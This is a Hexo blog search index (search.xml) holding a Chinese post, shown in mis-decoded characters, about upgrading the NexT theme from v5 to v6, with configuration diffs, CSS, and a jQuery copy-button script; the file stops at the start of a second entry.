<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Hexoåšå®¢NexTä¸»é¢˜ä»Žv5.x.xæ›´æ–°åˆ°v6.x.xçš„è®°å½•åŠæ€»ç»“]]></title>
    <url>%2Farchives%2F14534beb.html</url>
    <content type="text"><![CDATA[å½“è¿™ä¸ªæ‘åº„å±€é™æˆ‘çš„ä¸€ç”Ÿæ—¶ï¼Œå°å°çš„åœ°çƒæ­£åœ¨å±€é™ç€æ•´ä¸ªäººç±»ã€‚ â€”â€”åˆ˜äº®ç¨‹ã€Šä¸€ä¸ªäººçš„æ‘åº„ã€‹ ç®€ä»‹ å› ä¸ºnexTä¸»é¢˜ä»Žv5.1.xæ›´æ–°åˆ°v6.0.xåŽï¼Œä¸»ä»“åº“å·²ä»Ž iissnan åä¸‹è¿ç§»è‡³ theme-next ç»„ç»‡ã€‚æ‰€ä»¥å°±å¯¼è‡´æ¯æ¬¡åœ¨ç»ˆç«¯ç”Ÿæˆã€éƒ¨ç½²åšå®¢çš„æ—¶å€™ï¼Œä¼šæœ‰ä¸»é¢˜è¿ç§»çš„ä¿¡æ¯ã€‚è™½ç„¶æ²¡ä»€ä¹ˆå®žè´¨çš„å½±å“ï¼Œä½†æ˜¯æ¯æ¬¡çœ‹åˆ°åŽæ€»ä¼šæœ‰äº›å½±å“å¿ƒæƒ…ã€‚ 1234567WARN ===============================================================WARN ========================= ATTENTION! ==========================WARN ===============================================================WARN NexT repository is moving here: https://github.com/theme-nextWARN ===============================================================WARN It's rebase to v6.0.0 and future maintenance will resume thereWARN =============================================================== æ‰€ä»¥è¶ç€ä»Šå¤©çš„ç©ºä½™æ—¶é—´ï¼Œå°±æŠŠåšå®¢ä¸»é¢˜ç›´æŽ¥æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬äº†ã€‚å› ä¸ºæ›´æ–°ä¼šç‰µæ‰¯åˆ°ä¸€äº›è‡ªå®šä¹‰çš„æ–‡ä»¶åŠæ ·å¼é…ç½®ï¼Œæ‰€ä»¥å°±éœ€è¦æ ¼å¤–å°å¿ƒè°¨æ…Žï¼Œæ›´æ–°ä¸­é‡åˆ°çš„é—®é¢˜åŠç›¸å…³è§£å†³æ–¹æ¡ˆè®°å½•äºŽæ­¤ï¼Œç•™ä½œé‡åˆ°ç›¸åŒé—®é¢˜çš„å°ä¼™ä¼´å‚è€ƒã€‚ æ›´æ–°å‰ï¼šHexo v3.7.1 vs NexT.Muse v5.1.4 æ›´æ–°åŽï¼šHexo v3.7.1 vs NexT.Muse v6.4.1ï¼ˆæˆªæ­¢æ›´æ–°æ—¶æ˜¯æœ€æ–°ç‰ˆæœ¬ï¼‰ æ­£æ–‡æ›´æ–°å‡†å¤‡ &amp; å®‰è£… æ›´æ–°å‰ï¼Œè¯·å‚è€ƒå®˜æ–¹çš„å‡çº§æŒ‡å¯¼ä»Ž NexT v5.1.x æ›´æ–°ï¼Œå¼ºçƒˆå»ºè®®æŒ‰ç…§å®˜æ–¹æŽ¨èçš„å‡çº§æ–¹å¼ï¼Œå³ä½¿å‡ºé”™ï¼Œä¹Ÿå¯ä»¥å›žé€€åˆ°ä¹‹å‰å¯ç”¨çš„ç‰ˆæœ¬ã€‚ å…³äºŽæ–°ä¸»é¢˜çš„ä¸‹è½½åŠç›®å½•ï¼Œå®˜æ–¹æŒ‡å¯¼æ–‡æ¡£å·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œä¹Ÿå¾ˆç®€å•ï¼Œè¿™é‡Œå°±ä¸åœ¨èµ˜è¿°ã€‚ ç«™ç‚¹é…ç½®æ–‡ä»¶ ç«™ç‚¹é…ç½®æ–‡ä»¶_config.ymlä½äºŽåšå®¢ç«™ç‚¹çš„æ ¹ç›®å½•ä¸‹ã€‚ ä¸‹è½½å®Œæ–°çš„ä¸»é¢˜åŽï¼Œå»ºè®®å°†ä¸»é¢˜ç›®å½•ä¸‹çš„_config.ymlæ–‡ä»¶å¤‡ä»½ä¸€ä»½ï¼Œä¾¿äºŽä¿®æ”¹å‡ºé”™æ¢å¤ã€‚ åˆ†åˆ«æ‰“å¼€åŽŸnextç›®å½•å’Œæ–°ç‰ˆæœ¬next-reloadedç›®å½•ä¸‹çš„_config.ymlæ–‡ä»¶ï¼Œè¿›è¡Œå¯¹æ¯”æ›´æ”¹ã€‚ä¿®æ”¹è¯­è¨€é…ç½®æ–‡ä»¶ æ–°ç‰ˆæœ¬è¯­è¨€é…ç½®æ–‡ä»¶å‘½åå‘ç”Ÿå˜åŒ–ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹ç«™ç‚¹é…ç½®æ–‡ä»¶ï¼š æœç´¢language:å­—æ®µï¼Œå°†åŽé¢çš„zh-Hans æ”¹ä¸º zh-CN ã€‚ 12- language: zh-Hans+ language: zh-CN ä¿®æ”¹åŠ è½½ä¸»é¢˜ æˆ‘ä»¬éœ€è¦è®©ç«™ç‚¹åŠ è½½æ–°çš„ä¸»é¢˜ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹ä¸»é¢˜åŠ è½½ç›®å½•ï¼š æœç´¢theme:å­—æ®µï¼Œå°†åŽé¢çš„next ä¿®æ”¹ä¸º next-reloaded 12- theme: next+ theme: next-reloaded ä¸»é¢˜é…ç½®æ–‡ä»¶ ä¸»é¢˜é…ç½®æ–‡ä»¶_config.ymlä½äºŽå¯¹åº”ä¸»é¢˜ç›®å½•ä¸‹ã€‚å…³é”®å­— ä¸»é¢˜é…ç½®æ–‡ä»¶é¦–å…ˆæ·»åŠ åšå®¢çš„å…³é”®å­—ï¼Œå¦‚æžœä½ æ—§ç‰ˆæœ¬æœ‰çš„è¯å°±ç›´æŽ¥æ‹·è´è¿‡æ¥ï¼š 12# Set default keywords (Use a comma to separate)keywords: "iOS, C, Object-C, Swift, Python" ç«™ç‚¹åˆ›å»ºæ—¶é—´ ç«™ç‚¹åˆ›å»ºæ—¶é—´ï¼Œå¦‚æžœä¸æŒ‡å®šï¼Œé»˜è®¤æ˜¯å½“å‰æ—¶é—´ï¼Œå¦‚2018ï¼Œæ ¹æ®éœ€è¦ä¿®æ”¹ï¼š å¦‚éœ€ä¿®æ”¹ï¼Œåªéœ€è¦ç§»é™¤since:å‰é¢çš„#å·å³å¯ã€‚ 1234 footer:# Specify the date when the site was setup.# If not defined, current year will be used.#since: 2015 ç«™ç‚¹èœå• èœå•åŠå›¾æ ‡é…ç½®ï¼Œå¯ä»¥ä»Žæ—§ç‰ˆæœ¬ç›´æŽ¥æ‹·è´æ›¿æ¢ï¼š 12345678910menu: home: / || home categories: /categories/ || th archives: /archives/ || archive about: /about/ || user tags: /tags/ || tags #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat commonweal: /404.html || heartbeat #å…¬ç›Š404 ç¤¾äº¤ ç¤¾äº¤åˆ†äº«ä¸€æ ·ï¼Œå¯ä»¥ç›´æŽ¥æ‹·è´åŽŸæœ‰çš„ï¼š 123social: GitHub: https://github.com/SevenCho || github E-Mail: mailto:243166621@qq.com || envelope åˆ†é¡µ å…³äºŽæ–‡ç« åˆ†é¡µï¼Œæˆ‘æ˜¯é€‰æ‹©å°†è‡ªåŠ¨åˆ†é¡µå…³é—­ï¼Œé‡‡ç”¨æ‰‹åŠ¨åˆ†é¡µçš„æ–¹å¼ï¼Œæ‰‹åŠ¨åˆ†é¡µçš„è¯å¯ä»¥æ›´å¥½çš„æŽ§åˆ¶æ˜¾ç¤ºçš„æ‘˜è¦ï¼Œv6.x é»˜è®¤å·²ç»å…³é—­ï¼Œå¦‚æžœä½ æƒ³æ‰“å¼€çš„è¯ï¼Œå¦‚ä¸‹ï¼š æ‰‹åŠ¨åˆ†é¡µåªéœ€è¦åœ¨éœ€è¦åˆ†é¡µçš„åœ°æ–¹æ·»åŠ &lt;!-- more --&gt;å³å¯ã€‚ 1234auto_excerpt:- enable: false+ enable: true length: 150 æ–‡ç«  &amp; æ‰“èµ &amp; ä¸ªäººå¤´åƒ å¦‚æžœæƒ³ä¿®æ”¹æ–‡ç« åˆ›å»ºã€æ›´æ–°æ—¶é—´ï¼Œæœç´¢post_meta:å­—æ®µï¼Œè¿›è¡Œä¿®æ”¹å³å¯ã€‚ ä¿®æ”¹æ‰“èµäºŒç»´ç ï¼Œæ²¡ä»€ä¹ˆè¯´çš„ï¼Œæœç´¢# Rewardï¼Œæ‹·è´æ—§ç‰ˆæœ¬æ›¿æ¢å³å¯ã€‚ ä¸ªäººä¸­å¿ƒçš„å¤´åƒä¿¡æ¯è®¾ç½®ï¼Œæœç´¢avatar: å·²ç»ä¸éœ€è¦è‡ªå·±è‡ªå®šä¹‰å®žçŽ°å¤´åƒåœ†å½¢æ ·å¼æ–‡ä»¶å’Œé¼ æ ‡æ‚¬æµ®çš„æ—‹è½¬æ•ˆæžœï¼Œé»˜è®¤å·²ç»é›†æˆï¼Œå¯ç”¨å³å¯ã€‚ 1234567891011avatar: # åœ¨åšå®¢çš„æ ¹ç›®å½• (source/images)çš„è¯: /images/avatar.gif # åœ¨ç«™ç‚¹ç›®å½• (source/uploads)çš„è¯: /uploads/avatar.gif # ä¹Ÿå¯ä»¥ç›´æŽ¥ä½¿ç”¨å›¾ç‰‡é“¾æŽ¥ url: /uploads/images/avatar.JPG # è®¾ç½®æ˜¯å¦è£å‰ªæˆåœ†å½¢ rounded: true # è®¾ç½®ä¸é€æ˜Žåº¦ 0 ~ 1 opacity: 1 # è®¾ç½®é¼ æ ‡æ”¾ä¸ŠåŽ»çš„æ—‹è½¬æ•ˆæžœ rotated: true ä»£ç å— å†…ç½®äº†ä»£ç å—çš„ä¸€äº›é…ç½®ï¼Œå¦‚è¾¹æ¡†ï¼Œæ‹·è´æŒ‰é’®ç­‰ç­‰ï¼Œä¸éœ€è¦æˆ‘ä»¬è‡ªå·±å†åœ¨æ ·å¼æ–‡ä»¶ä¸­è‡ªå®šä¹‰äº†ï¼Œ æœç´¢codeblock:ï¼š 12345678codeblock: # ä»£ç å—è¾¹æ¡†åœ†è§’åŠå¾„ï¼Œä¸è®¾ç½®é»˜è®¤æ˜¯1 border_radius: # æ·»åŠ ä¸€ä¸ª`æ‹·è´`æŒ‰é’®ï¼Œå¯ä»¥æ‹·è´ä»£ç å—å†…å®¹ï¼Œä¸éœ€è¦æˆ‘ä»¬è‡ªå·±åŽ»è‡ªå®šä¹‰äº† copy_button: enable: false # æ˜¯å¦æ˜¾ç¤ºç»“æžœ show_result: false ç‰ˆæƒ è®¾ç½®ç«™ç‚¹ç‰ˆæƒä¿¡æ¯ï¼Œå¯ä»¥æœç´¢post_copyright:å­—æ®µï¼Œæ ¹æ®è‡ªå·±éœ€è¦ä¿®æ”¹ï¼Œå¦‚æˆ‘çš„ï¼š 1234post_copyright: enable: true license: CC BY-NC-SA 3.0 license_url: https://creativecommons.org/licenses/by-nc-sa/3.0/ ç”¨æˆ·å°å›¾æ ‡ ä¿®æ”¹ç«™ç‚¹åº•éƒ¨ç”¨æˆ·å°å›¾æ ‡ï¼ŒçŽ°åœ¨å·²ç»å†…ç½®è¯¥åŠŸèƒ½ï¼Œè¿˜å¯ä»¥è®¾ç½®åŠ¨ç”»ï¼Œæœç´¢icon:å¯åŠ¨å³å¯ï¼š å›¾æ ‡ä»¥fontawesomemå‘½åï¼Œæ›´å¤šå›¾æ ‡åœ¨è¿™é‡Œ å¦‚æžœä½¿ç”¨heartå›¾æ ‡å»ºè®®ä½¿ç”¨çº¢è‰²(#ff0000)ã€‚ å¦‚ä¸‹æ˜¯æˆ‘æ˜¾ç¤ºçš„å¿ƒå½¢å›¾æ ‡åŠé¢œè‰²å’Œå¯ç”¨åŠ¨ç”»ã€‚ 1234icon: name: heart # user animated: true color: &quot;#ff0000&quot; é…ç½®ç«™ç‚¹æ–‡å­— è‡ªå¸¦çš„ä¸»é¢˜é»˜è®¤ä¼šæ ¹æ®è®¾å¤‡æŸ¥è¯¢æ˜¯å¦å®‰è£…äº†å¯¹åº”çš„å¸¸ç”¨å­—ä½“ï¼šå¦‚è‹¹æžœçš„è‹¹æ–¹å­—ä½“ï¼Œå¾®è½¯çš„é›…é»‘å­—ä½“ã€‚ æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰ç½‘ç«™åœ°å€ï¼Œå‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æŽ¥åœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­ï¼Œæœç´¢font:å³å¯ä»¥ä¿®æ”¹å…¨å±€å­—ä½“ï¼Œæ ‡é¢˜å­—ä½“ã€æ–‡ç« å­—ä½“ã€logoå­—ä½“ã€ä»£ç å—å­—ä½“ç­‰ç­‰ã€‚ å¦‚æžœæˆ‘ä»¬è®¾ç½®çš„å­—ä½“åœ¨ç”¨æˆ·è®¾å¤‡ä¸Šæ²¡æœ‰å®‰è£…ï¼Œä¼šå›žé€€åˆ°ä¸»é¢˜çš„é»˜è®¤å­—ä½“è®¾ç½®ä¸Šã€‚ è¿™é‡Œæ¯ç§ç±»åˆ«åªå¯ä»¥è®¾ç½®ä¸€ç§è‡ªå®šä¹‰çš„å­—ä½“ã€‚ å¦‚æžœè¿˜éœ€è¦ç²¾ç»†æŽ§åˆ¶æ¯ä¸€å¤„çš„å­—ä½“ï¼Œå¯ä»¥é€šè¿‡æµè§ˆå™¨çš„è°ƒè¯•åŠŸèƒ½ï¼ŒæŠ“å–åˆ°å¯¹åº”çš„æ ‡ç­¾åœ¨è‡ªå®šä¹‰æ ·å¼æ–‡ä»¶ä¸­è®¾ç½®ã€‚ é…ç½®æ’ä»¶ å‡çº§åŽå¤§éƒ¨åˆ†æ’ä»¶ä¹Ÿæœ‰å˜åŠ¨ï¼Œå¦‚æžœä½ æœ‰ç”¨åˆ°ä¸‹é¢çš„æ’ä»¶çš„è¯ï¼Œå¯ä»¥å‚è€ƒã€‚ æ–‡ç« ç»Ÿè®¡ æ—§ç‰ˆæœ¬æ˜¯ä½¿ç”¨post_wordcountç»Ÿè®¡æ–‡ç« çš„å­—æ•°ï¼Œé˜…è¯»æ—¶é•¿ç­‰ç­‰ï¼Œæ–°ç‰ˆæœ¬è¯¥æ’ä»¶åºŸå¼ƒï¼Œå¹¶ä¸”å†…ç½®äº†symbols_count_timeä½œä¸ºæ›¿æ¢ã€‚ å‚è€ƒè¿™é‡Œè¿›è¡Œå®‰è£…åŠé…ç½®ã€‚ æœ¬åœ°æœç´¢ æœ¬åœ°æœç´¢å†…ç½®è¿›ä¸»é¢˜ï¼Œä¾èµ–å¯ç”¨hexo-generator-searchdbæ’ä»¶ã€‚ å‚è€ƒè¿™é‡Œè¿›è¡Œå®‰è£…åŠé…ç½®ã€‚ å›¾ç‰‡é¢„è§ˆ å›¾ç‰‡é¢„è§ˆå·²ç»å†…ç½®äº†æ–°çš„é¢„è§ˆé…ç½®ï¼Œ åªéœ€è¦å®‰è£…å¯åŠ¨ä¾èµ–æ’ä»¶theme-next-fancybox3å³å¯ã€‚ å‚è€ƒè¿™é‡Œè¿›è¡Œå®‰è£…åŠé…ç½®ã€‚ é¡¶éƒ¨åŠ è½½è¿›åº¦æ¡ ç«™ç‚¹çš„é¡¶éƒ¨åŠ è½½è¿›åº¦æ¡ä¹Ÿå·²ç»å†…ç½®ï¼Œåªéœ€è¦å®‰è£…å¯åŠ¨ä¾èµ–æ’ä»¶theme-next-paceå³å¯ã€‚ å‚è€ƒè¿™é‡Œè¿›è¡Œå®‰è£…åŠé…ç½®ã€‚ é…ç½®æ–‡ä»¶ç½‘ç«™logoå›¾æ ‡ é…ç½®ç½‘ç«™çš„logoå›¾æ ‡ï¼Œè¯·åœ¨/Blog/themes/next-reloaded/source/imagesç›®å½•ä¸­æ›¿æ¢å¦‚ä¸‹å›¾æ ‡ï¼š favicon-32x32-next.png favicon-16x16-next.png logo.svg æ–‡å­—å…³è”æ ‡ç­¾å›¾æ ‡ æ–‡ç« çš„é»˜è®¤æ ‡ç­¾å›¾æ ‡æ˜¯ä¸€ä¸ª#å·ï¼Œä¸æ˜¯å¾ˆå–œæ¬¢ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸ºè‡ªå·±å–œæ¬¢çš„å›¾æ ‡ï¼Œå¦‚æ‹Ÿç‰©çš„æ ‡ç­¾å›¾æ ‡ï¼š æ‰“å¼€ /Blog/themes/next-reloaded/layout/_macro/ç›®å½•ä¸‹çš„post.swig æ–‡ä»¶ã€‚ æœç´¢ rel=&quot;tag&quot;&gt;# , å°† # æ¢æˆ &lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;ã€‚ è‡ªå®šä¹‰é…ç½® æ—§ç‰ˆæœ¬çš„ä¸€äº›è‡ªå®šä¹‰çš„é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥ç›´æŽ¥æ‹·è´åˆ°æ–°çš„ä¸»é¢˜å¯¹åº”ä½ç½®ä¸‹ï¼š /Blog/themes/next-reloaded/source/css/_custom/ç›®å½•ä¸‹çš„custom.stylæ–‡ä»¶ã€‚ /Blog/themes/next-reloaded/source/css/_variables/ç›®å½•ä¸‹çš„custom.stylæ–‡ä»¶ã€‚ /Blog/themes/next-reloaded/layout/_custom/ç›®å½•ä¸‹çš„custom.swigæ–‡ä»¶ã€‚ å¼•ç”¨æ ·å¼ä¿®æ”¹ å¦‚æžœéœ€è¦ä¿®æ”¹blockquoteå¼•ç”¨æ ·å¼ï¼š å¯ä»¥åœ¨/Blog/themes/next-reloaded/source/css/_common/scaffolding/ç›®å½•ä¸‹çš„base.stylæ–‡ä»¶ç›´æŽ¥ä¿®æ”¹ã€‚ æŽ¨èåœ¨/Blog/themes/next-reloaded/source/css/_custom/ç›®å½•ä¸‹çš„custom.stylæ–‡ä»¶ä¸­è‡ªå®šä¹‰æ ·å¼å³å¯ã€‚ åˆ†å‰²çº¿æ ·å¼ ä¿®æ”¹æ–‡ç« åˆ†å‰²çº¿æ ·å¼ï¼Œå‚è€ƒ/Blog/themes/next-reloaded/source/css/_common/components/post/ç›®å½•ä¸‹çš„post-eof.stylæ–‡ä»¶ã€‚ ç½‘ç«™ç‰ˆæƒ ç«™ç‚¹çš„ç‰ˆæƒé…ç½®æ–‡ä»¶ï¼Œç›´æŽ¥æ‹·è´æ—§ä¸»é¢˜å¯¹åº”ç›®å½•æ–‡ä»¶åˆ°å¯¹åº”ç›®å½•å³å¯ï¼š /Blog/themes/next-reloaded/layout/_macro/ç›®å½•ä¸‹çš„my-copyright.swigæ–‡ä»¶ã€‚ æ–‡ç« ç‰ˆæƒ ç›´æŽ¥æ‹·è´æ—§ä¸»é¢˜å¯¹åº”ç›®å½•æ–‡ä»¶åˆ°æ–°çš„ä¸»é¢˜ç›®å½•å³å¯ï¼š /Blog/themes/next-reloaded/source/css/_common/components/post/ç›®å½•ä¸‹my-post-copyright.stylæ–‡ä»¶ã€‚ é«˜äº®æ ·å¼ é…ç½®ä¸»é¢˜çš„ä¸€äº›é«˜äº®æ˜¾ç¤ºæ ·å¼ï¼Œå¯ä»¥é…åˆè‡ªå®šä¹‰çš„æ ·å¼æ–‡ä»¶ä¸€èµ·ä½¿ç”¨ï¼š /Blog/themes/next-reloaded/source/css/_common/components/highlight/ç›®å½•ä¸‹çš„highlight.stylæ–‡ä»¶ã€‚ å¤´åƒè¾¹æ¡†åŠæ—‹è½¬ ï¼ˆæ—§ç‰ˆæœ¬ï¼‰ æ—§ç‰ˆæœ¬çš„å¤´åƒæ ·å¼åŠé¼ æ ‡æ‚¬æµ®æ—‹è½¬åœ¨è¿™é‡Œæ·»åŠ ï¼ˆæ–°ç‰ˆæœ¬å·²ç»å†…ç½®ï¼Œå¯ä»¥ä¸ç”¨ç®¡ï¼‰ /Blog/themes/next-reloaded/source/css/_common/components/sidebar/ç›®å½•ä¸‹çš„sidebar-author.stylæ–‡ä»¶ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738.site-author-image &#123; display: block; margin: 0 auto; padding: $site-author-image-padding; max-width: $site-author-image-width; height: $site-author-image-height; border: $site-author-image-border-width solid $site-author-image-border-color; // ä¿®æ”¹å¤´åƒè¾¹æ¡† border-radius: 50%; -webkit-border-radius: 50%; -moz-border-radius: 50%; // è®¾ç½®æ—‹è½¬ transition: 1.5s all;&#125;// å¯æ—‹è½¬çš„åœ†å½¢å¤´åƒ,`hover`åŠ¨ä½œ.site-author-image:hover &#123;-webkit-transform: rotate(360deg);-moz-transform: rotate(360deg);-ms-transform: rotate(360deg);-transform: rotate(360deg);&#125;.site-author-name &#123; margin: $site-author-name-margin; text-align: $site-author-name-align; color: $site-author-name-color; font-weight: $site-author-name-weight;&#125;.site-description &#123; margin-top: $site-description-margin-top; text-align: $site-description-align; font-size: $site-description-font-size; color: $site-description-color;&#125; ä»£ç å—æ‹·è´æŒ‰é’® ï¼ˆæ—§ç‰ˆæœ¬ï¼‰ æ—§ç‰ˆæœ¬ä»£ç å—å¤åˆ¶æŒ‰é’®åœ¨è¿™é‡Œæ·»åŠ ï¼ˆæ–°ç‰ˆæœ¬å·²ç»å†…ç½®ï¼Œåªéœ€å¯ç”¨å³å¯ï¼Œå¯ä»¥ä¸ç”¨ç®¡ï¼‰ /Blog/themes/next/source/js/src/ç›®å½•ä¸‹æ–°å»ºcustom.jsæ–‡ä»¶ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102//æ­¤å‡½æ•°ç”¨äºŽåˆ›å»ºå¤åˆ¶æŒ‰é’®function createCopyBtns() &#123; var $codeArea = $("figure table"); //æŸ¥çœ‹é¡µé¢æ˜¯å¦å…·æœ‰ä»£ç åŒºåŸŸï¼Œæ²¡æœ‰ä»£ç å—åˆ™ä¸åˆ›å»º å¤åˆ¶æŒ‰é’® if ($codeArea.length &gt; 0) &#123; //å¤åˆ¶æˆåŠŸåŽå°†è¦å¹²çš„äº‹æƒ… function changeToSuccess(item) &#123; $imgOK = $("#copyBtn").find("#imgSuccess"); if ($imgOK.css("display") == "none") &#123; $imgOK.css(&#123; opacity: 0, display: "block" &#125;); $imgOK.animate(&#123; opacity: 1 &#125;, 1000); setTimeout(function() &#123; $imgOK.animate(&#123; opacity: 0 &#125;, 2000); &#125;, 2000); setTimeout(function() &#123; $imgOK.css("display", "none"); &#125;, 4000); &#125;; &#125;; //åˆ›å»º å…¨å±€å¤åˆ¶æŒ‰é’®ï¼Œä»…æœ‰ä¸€ç»„ã€‚åŒ…å«ï¼šå¤åˆ¶æŒ‰é’®ï¼Œå¤åˆ¶æˆåŠŸå“åº”æŒ‰é’® //å€¼å¾—æ³¨æ„çš„æ˜¯ï¼š1.æŒ‰é’®é»˜è®¤éšè—ï¼Œ2.ä½ç½®ä½¿ç”¨ç»å¯¹ä½ç½® position: absolute; (position: fixed ä¹Ÿå¯ä»¥ï¼Œéœ€è¦ä¿®æ”¹ä»£ç ) $(".post-body").before('&lt;div id="copyBtn" style="opacity: 0; position: absolute;top:0px;display: none;line-height: 1; font-size:1.5em"&gt;&lt;span id="imgCopy" &gt;&lt;i class="fa fa-paste fa-fw"&gt;&lt;/i&gt;&lt;/span&gt;&lt;span id="imgSuccess" style="display: none;"&gt;&lt;i class="fa fa-check-circle fa-fw" aria-hidden="true"&gt;&lt;/i&gt;&lt;/span&gt;'); //åˆ›å»º å¤åˆ¶ æ’ä»¶ï¼Œç»‘å®šå•æœºæ—¶é—´åˆ° æŒ‡å®šå…ƒç´ ï¼Œæ”¯æŒJQuery var clipboard = new Clipboard('#copyBtn', &#123; target: function() &#123; //è¿”å›žéœ€è¦å¤åˆ¶çš„å…ƒç´ å†…å®¹ return document.querySelector("[copyFlag]"); &#125;, isSupported: function() &#123; //æ”¯æŒå¤åˆ¶å†…å®¹ return document.querySelector("[copyFlag]"); &#125; &#125;); //å¤åˆ¶æˆåŠŸäº‹ä»¶ç»‘å®š clipboard.on('success', function(e) &#123; //æ¸…é™¤å†…å®¹è¢«é€‰æ‹©çŠ¶æ€ e.clearSelection(); changeToSuccess(e); &#125;); //å¤åˆ¶å¤±è´¥ç»‘å®šäº‹ä»¶ clipboard.on('error', function(e) &#123; console.error('Action:', e.action); console.error('Trigger:', e.trigger); &#125;); //é¼ æ ‡ åœ¨å¤åˆ¶æŒ‰é’®ä¸Šæ»‘åŠ¨å’Œç¦»å¼€åŽæ¸å˜æ˜¾ç¤º/éšè—æ•ˆæžœ $("#copyBtn").hover( function() &#123; $(this).stop(); $(this).css("opacity", 1); &#125;, function() &#123; $(this).animate(&#123; opacity: 0 &#125;, 2000); &#125; ); &#125;&#125;//æ„Ÿåº”é¼ æ ‡æ˜¯å¦åœ¨ä»£ç åŒº$("figure").hover( function() &#123; //-------é¼ æ ‡æ´»åŠ¨åœ¨ä»£ç å—å†… //ç§»é™¤ä¹‹å‰å«æœ‰å¤åˆ¶æ ‡å¿—ä»£ç å—çš„ copyFlag $("[copyFlag]").removeAttr("copyFlag"); //åœ¨æ–°çš„ï¼ˆå½“å‰é¼ æ ‡æ‰€åœ¨ä»£ç åŒºï¼‰ä»£ç å—æ’å…¥æ ‡å¿—ï¼šcopyFlag $(this).find(".code").attr("copyFlag", 1); //èŽ·å–å¤åˆ¶æŒ‰é’® $copyBtn = $("#copyBtn"); if ($copyBtn.lenght != 0) &#123; //èŽ·å–åˆ°æŒ‰é’®çš„å‰æä¸‹è¿›è¡Œä¸€ä¸‹æ“ä½œ //åœæ­¢æŒ‰é’®åŠ¨ç”»æ•ˆæžœ //è®¾ç½®ä¸º æ˜¾ç¤ºçŠ¶æ€ //ä¿®æ”¹ å¤åˆ¶æŒ‰é’® ä½ç½®åˆ° å½“å‰ä»£ç å—å¼€å§‹éƒ¨ä½ //è®¾ç½®ä»£ç å— å·¦ä¾§ä½ç½® $copyBtn.stop(); $copyBtn.css("opacity", 0.8); $copyBtn.css("display", "block"); $copyBtn.css("top", parseInt($copyBtn.css("top")) + $(this).offset().top - $copyBtn.offset().top + 3); $copyBtn.css("left", -$copyBtn.width() - 3); &#125; &#125;, function() &#123; //-------é¼ æ ‡ç¦»å¼€ä»£ç å— //è®¾ç½®å¤åˆ¶æŒ‰é’®å¯è§åº¦ 2ç§’å†…åˆ° 0 $("#copyBtn").animate(&#123; opacity: 0 &#125;, 2000); &#125;);//é¡µé¢è½½å…¥å®ŒæˆåŽï¼Œåˆ›å»ºå¤åˆ¶æŒ‰é’®$(document).ready(function() &#123; createCopyBtns();&#125;); æ€»ç»“ æ€»ä½“æ¥è¯´ï¼Œæ•´ä¸ªæ›´æ–°å‡çº§çš„è¿‡ç¨‹è¿˜æ˜¯æ²¡æœ‰å¤ªå¤šçš„å‘çš„ï¼Œæˆ‘åœ¨ç¬¬ä¸€æ¬¡ä¿®æ”¹çš„æ—¶å€™ï¼Œä¸€å£æ°”æŠŠæ•´ä¸ªä¸»é¢˜é…ç½®æ–‡ä»¶éƒ½ä¿®æ”¹å®Œäº†ï¼Œæœ€åŽå‘çŽ°è¿è¡Œä¸èµ·æ¥ï¼Œç„¶åŽå°±æ˜¯æ¢å¤åŽé‡æ–°ä¸€å¤„ä¸€å¤„ä¿®æ”¹ã€‚å¦‚æžœä¸æ˜¯å¾ˆæ¸…æ¥šåŠŸèƒ½ï¼Œå»ºè®®æ¯ä¿®æ”¹ä¸€å¤„å°±è¿è¡Œä¸€æ¬¡ï¼Œç¨³æ­¥æŽ¨è¿›ã€‚ å¦‚æžœæ˜¯ä¸»é¢˜æ–‡ä»¶ä¿®æ”¹åŽæ— æ³•è¿è¡Œï¼Œå»ºè®®å…ˆåœ¨è¿™é‡Œæ ¡éªŒä¸‹æ–‡ä»¶æœ‰æ— è¯­æ³•é”™è¯¯ï¼Œå°¤å…¶æ˜¯æˆ‘ä»¬ä¸å¤ªæ³¨æ„çš„ç©ºæ ¼æœ‰æ—¶å°±æ˜¯ç½ªé­ç¥¸é¦–ã€‚ æˆ‘é‡åˆ°ç›´æŽ¥æ¸…ç©ºæœ¬åœ°çš„ç”Ÿæˆæ–‡ä»¶ç„¶åŽé‡æ–°ç”Ÿæˆï¼Œåœ¨æœ¬åœ°é¢„è§ˆæ˜¯å®Œå¥½çš„ï¼Œä½†æ˜¯éƒ¨ç½²åˆ°å¤–ç½‘å°±ç½‘ç«™æ ¼å¼å…¨éƒ¨æ²¡æœ‰äº†ã€‚æœ€åŽæˆ‘å°†åŽŸnextä¸»é¢˜ç›®å½•æ›´æ”¹åç§°ä¸ºnext-v5ï¼ˆåå­—éšä¾¿ï¼Œä¾¿äºŽåŒºåˆ†å³å¯ï¼‰ï¼Œç„¶åŽå°†æ–°ç‰ˆæœ¬next-reloadedä¸»é¢˜ç›®å½•åå­—ä¿®æ”¹ä¸ºnextï¼Œåœ¨åšå®¢æ ¹ç›®å½•ä¿®æ”¹åŠ è½½ä¸»é¢˜ä¸ºnextï¼Œç„¶åŽæ²¡æœ‰é—®é¢˜äº†ã€‚å¦‚æžœæœ‰é‡åˆ°åŒæ ·é—®é¢˜çš„å°ä¼™ä¼´å¯ä»¥è¿™æ ·å°è¯•ä¸‹ã€‚]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>Blog</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è®°ä¸€æ¬¡iOSä½¿ç”¨XTEAå¾®åž‹åŠ å¯†ç®—æ³•]]></title>
    <url>%2Farchives%2Fd3400f8e.html</url>
